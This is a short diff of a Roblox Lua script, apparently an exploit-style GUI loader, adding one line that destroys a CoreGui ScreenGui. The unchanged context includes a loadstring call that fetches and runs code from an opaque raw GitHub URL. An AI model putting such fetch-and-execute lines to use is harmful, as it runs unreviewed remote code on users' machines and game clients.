@@ -59,5 +59,6 @@ local function OAQJEJ_fake_script() -- Text.LocalScript
 	wait(3.0)
 	game.CoreGui.ScreenGui:Destroy()
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/ua835818/aaa/main/A95KKK31848KAK438", true))()
+        game.CoreGui.ScreenGui:Destroy()
 end
 coroutine.wrap(OAQJEJ_fake_script)()
